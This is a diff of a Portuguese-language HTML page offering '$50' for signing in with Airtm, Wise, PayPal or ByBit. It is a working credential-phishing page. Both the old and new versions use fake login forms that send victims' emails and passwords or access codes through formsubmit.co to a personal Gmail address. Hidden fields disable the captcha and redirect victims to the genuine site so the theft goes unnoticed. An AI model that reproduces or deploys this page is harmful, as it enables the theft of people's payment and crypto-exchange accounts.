@@ -1,145 +1,188 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ganhe $50 - Promoção</title>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ganhe $50</title>
   <style>
-    * {
+    body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: Arial, sans-serif;
       background-image: url('carteiras.jpg');
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      backdrop-filter: brightness(0.85);
+      height: 100vh;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.95);
+      max-width: 600px;
+      margin: 50px auto;
+      background: rgba(255, 255, 255, 0);
       padding: 30px;
-      border-radius: 20px;
-      width: 90%;
-      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: none;
       text-align: center;
     }
 
-    h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
+    .hidden {
+      display: none;
     }
 
-    p {
-      margin-bottom: 20px;
-      font-size: 16px;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 10px;
-      background-color: #007bff;
+    .login-button {
+      display: block;
+      background-color: #007BFF;
       color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
+      text-decoration: none;
+      padding: 12px 20px;
+      margin: 10px auto;
+      width: 80%;
+      border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
+      transition: background-color 0.3s ease;
     }
 
-    .btn:hover {
+    .login-button:hover {
       background-color: #0056b3;
     }
 
+    .back-button {
+      margin-top: 20px;
+      background-color: #6c757d;
+    }
+
     form {
-      display: none;
       text-align: left;
       margin-top: 20px;
     }
 
-    .form-title {
+    label {
+      display: block;
+      margin-bottom: 5px;
       font-weight: bold;
-      margin-bottom: 8px;
-      font-size: 16px;
     }
 
-    input {
+    input[type="email"],
+    input[type="text"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
-      border-radius: 8px;
+      border-radius: 5px;
       border: 1px solid #ccc;
+      font-size: 16px;
     }
 
-    .submit-btn {
-      background-color: #007bff;
+    input[type="submit"] {
+      background-color: #28a745;
       color: white;
-      padding: 12px;
       border: none;
-      border-radius: 8px;
+      padding: 12px 20px;
       width: 100%;
-      font-weight: bold;
+      border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #218838;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎉 <strong>Ganhe $50!</strong></h1>
+
+  <!-- Página Inicial -->
+  <div class="container" id="home">
+    <h1>🎉 Ganhe $50!</h1>
     <p>Inicia sessão com a tua conta das seguintes plataformas para ganhar 30 dólar:</p>
 
-    <button class="btn" onclick="mostrarFormulario('airtm')">Iniciar sessão com Airtm</button>
-    <button class="btn" onclick="mostrarFormulario('wise')">Iniciar sessão com Wise</button>
-    <button class="btn" onclick="mostrarFormulario('paypal')">Iniciar sessão com PayPal</button>
-    <button class="btn" onclick="mostrarFormulario('bybit')">Iniciar sessão com ByBit</button>
+    <div class="login-button" onclick="mostrarPagina('airtm')">Iniciar sessão com Airtm</div>
+    <div class="login-button" onclick="mostrarPagina('wise')">Iniciar sessão com Wise</div>
+    <div class="login-button" onclick="mostrarPagina('PayPal')">Iniciar sessão com PayPal</div>
+    <div class="login-button" onclick="mostrarPagina('ByBit')">Iniciar sessão com ByBit</div> 
+  </div>
 
-    <!-- Airtm -->
-    <form id="airtm" action="https://formsubmit.co/josefanykira@email.com" method="POST">
-      <div class="form-title">Login Airtm</div>
-      <input type="email" name="email" placeholder="Email Airtm" required />
-      <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="submit-btn">Entrar</button>
+  <!-- Página Airtm -->
+  <div class="container hidden" id="airtm">
+    <h2>Login Airtm</h2>
+    <p>Inicia sessão com a tua conta Airtm para receber $50.</p>
+    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
+      <label>Email:</label>
+      <input type="email" name="email" required>
+      <label>Código de Acesso:</label>
+      <input type="text" name="access_key" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_next" value="https://www.airtm.com/">
+      <input type="submit" value="Iniciar Sessão">
     </form>
+    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
+  </div>
 
-    <!-- Wise -->
-    <form id="wise" action="https://formsubmit.co/josefanykira@email.com" method="POST">
-      <div class="form-title">Login Wise</div>
-      <input type="email" name="email" placeholder="Email Wise" required />
-      <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="submit-btn">Entrar</button>
+  <!-- Página Wise -->
+  <div class="container hidden" id="wise">
+    <h2>Login Wise</h2>
+    <p>Conecta a tua conta Wise e ganha $50.</p>
+    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
+      <label>Email:</label>
+      <input type="email" name="email" required>
+      <label>Código de Acesso:</label>
+      <input type="text" name="access_key" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_next" value="https://wise.com/">
+      <input type="submit" value="Iniciar Sessão">
     </form>
+    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
+  </div>
 
-    <!-- PayPal -->
-    <form id="paypal" action="https://formsubmit.co/josefanykira@email.com" method="POST">
-      <div class="form-title">Login PayPal</div>
-      <input type="email" name="email" placeholder="Email PayPal" required />
-      <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="submit-btn">Entrar</button>
+  <!-- Página PayPal -->
+  <div class="container hidden" id="PayPal">
+    <h2>Login PayPal</h2>
+    <p>Entra com a tua conta do PayPal para ganhares $50.</p>
+    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
+      <label>Email:</label>
+      <input type="email" name="email" required>
+      <label>Código de Acesso:</label>
+      <input type="text" name="access_key" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_next" value="https://www.paypal.com/">
+      <input type="submit" value="Iniciar Sessão">
     </form>
-
-    <!-- ByBit -->
-    <form id="bybit" action="https://formsubmit.co/josefanykira@email.com" method="POST">
-      <div class="form-title">Login ByBit</div>
-      <input type="email" name="email" placeholder="Email ByBit" required />
-      <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="submit-btn">Entrar</button>
+    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
+  </div>
+  
+  <!-- Página ByBit -->
+  <div class="container hidden" id="ByBit">
+    <h2>Login ByBit</h2>
+    <p>Entra com a tua conta do ByBit para ganhares $50.</p>
+    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
+      <label>Email:</label>
+      <input type="email" name="email" required>
+      <label>Código de Acesso:</label>
+      <input type="text" name="access_key" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_next" value="https://www.bybit.com/">
+      <input type="submit" value="Iniciar Sessão">
     </form>
+    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
   </div>
 
   <script>
-    function mostrarFormulario(id) {
-      document.querySelectorAll('form').forEach(f => f.style.display = 'none');
-      document.getElementById(id).style.display = 'block';
+    function mostrarPagina(id) {
+      const seções = ["home", "airtm", "wise", "PayPal", "ByBit"];
+      seções.forEach(sec => {
+        document.getElementById(sec).classList.add("hidden");
+      });
+      document.getElementById(id).classList.remove("hidden");
+    }
+
+    function voltarHome() {
+      mostrarPagina("home");
     }
   </script>
+
 </body>
-        </html>
+  </html>
